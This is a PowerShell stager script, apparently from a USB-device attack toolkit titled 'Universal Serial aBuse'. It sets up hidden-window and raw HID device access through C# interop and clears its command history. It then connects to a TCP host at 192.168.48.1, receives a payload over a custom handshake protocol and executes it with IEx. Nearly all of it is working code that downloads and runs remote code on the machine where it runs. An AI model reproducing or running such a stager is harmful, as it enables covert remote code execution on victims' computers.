$ui = $Host.UI.RawUI
# $ui.ForegroundColor = $ui.BackgroundColor
Clear

$ui.WindowTitle = 'Universal Serial aBuse'
$M = 64
$cs = '
using System;
using System.IO;
using Microsoft.Win32.SafeHandles;
using System.Runtime.InteropServices;
namespace n {
	public class w {
		[DllImport(%kernel32.dll%, CharSet = CharSet.Auto, SetLastError = true)]
		public static extern SafeFileHandle CreateFile(String fn, UInt32 da, Int32 sm, IntPtr sa, Int32 cd, uint fa, IntPtr tf);
		[DllImport(%user32.dll%)]
		public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
		[DllImport(%user32.dll%)]
		public static extern IntPtr SetWindowPos(IntPtr hWnd, int hWndInsertAfter, int x, int Y, int cx, int cy, int wFlags);

		public static FileStream o(string fn) {
			return new FileStream(CreateFile(fn, 0XC0000000U, 3, IntPtr.Zero, 3, 0x40000000, IntPtr.Zero), FileAccess.ReadWrite, 9, true);
		}
	}
}
'.Replace('%',[char]34)
Add-Type -TypeDefinition $cs
$h = (Get-Process -Id $pid).MainWindowHandle
# $null = [n.w]::SetWindowPos($h, -2, 2000, 2000, 40, 40, 5)

function bs ($v, $n) { [math]::floor($v * [math]::pow(2, $n)) }
function sa($s,$a) { (bs ($s -band 15) 4) + ($a -band 15)}
function isack($s, $z) { (($s+1) -band 15) -eq ($z -band 15)}

& {
	clhy
#	$null = [n.w]::ShowWindowAsync($h, 0)
#	$devs = gwmi Win32_USBControllerDevice
#	foreach ($dev in $devs) {
#		$wmidev = [wmi]$dev.Dependent
#		if ($wmidev.GetPropertyValue('DeviceID') -match ('1209&PID_6667') -and ($wmidev.GetPropertyValue('Service') -eq $null)) {
#			$fn = ([char]92+[char]92+'?'+[char]92 + $wmidev.GetPropertyValue('DeviceID').ToString().Replace([char]92,[char]35) + [char]35+'{4d1e55b2-f16f-11cf-88cb-001111000030}')
#		}
#	}
	try {
#		$f = [n.w]::o($fn)
		$f = (New-Object Net.Sockets.TcpClient("192.168.48.1", 65534)).GetStream()
		[System.Console]::WriteLine("File is open")
		$seq = 6
		$ack = 0
		$flag = 1 #SYN
		$d = New-Object IO.MemoryStream
		$start = $(get-date)
		while(1) {
			$b = New-Object Byte[]($M+1)
			$b[2] = $flag
			$b[3] = sa $seq $ack
			[System.Console]::WriteLine([String]::Format("W: C={0} F={1} S={2} A={3} L={4}", $b[1], $b[2], (bs $b[3] -4), ($b[3] -band 15), $b[4]))
			$f.Write($b, 0, $M+1)
			if ($flag -eq 6) {break} # We've sent the FIN/ACK
			$r = $f.Read($b, 0, $M+1)
			[System.Console]::WriteLine([String]::Format("R: C={0} F={1} S={2} A={3} L={4}", $b[1], $b[2], (bs $b[3] -4), ($b[3] -band 15), $b[4]))
			if ($b[1] -ne 0) { # Not channel 0
				$flag = 8 # RST
			} elseif (isack $seq $b[3]) {
				$ack = (bs $b[3] -4) + 1
				if ($b[2] -band 8) {       #RST
					[System.Console]::WriteLine("RST")
					$d = New-Object IO.MemoryStream
					$flag = 1
				} elseif ($b[2] -band 4) { # FIN
					$flag = 6                # FIN/ACK
					$seq++
					[System.Console]::WriteLine("FIN")
				} elseif ($b[2] -band 2) { # SYN/ACK or ACK
					$d.Write($b,5,$b[4])
					[System.Console]::WriteLine(([Text.Encoding]::ASCII).GetString($b, 5, $b[4]))
					$flag = 2
				}
			} else {
				[System.Console]::WriteLine("BAD ACK! " + $seq + ":" + ($b[3] -band 15))
				# exit
			}
		}
		[System.Console]::WriteLine($(get-date) - $start)
		[System.Console]::WriteLine(([Text.Encoding]::ASCII).GetString($d.ToArray()))
		[System.Console]::WriteLine($d.Length)
		IEx ([Text.Encoding]::ASCII).GetString($d.ToArray())
	} catch {
		echo $_.Exception|format-list -force
	}
	exit
}

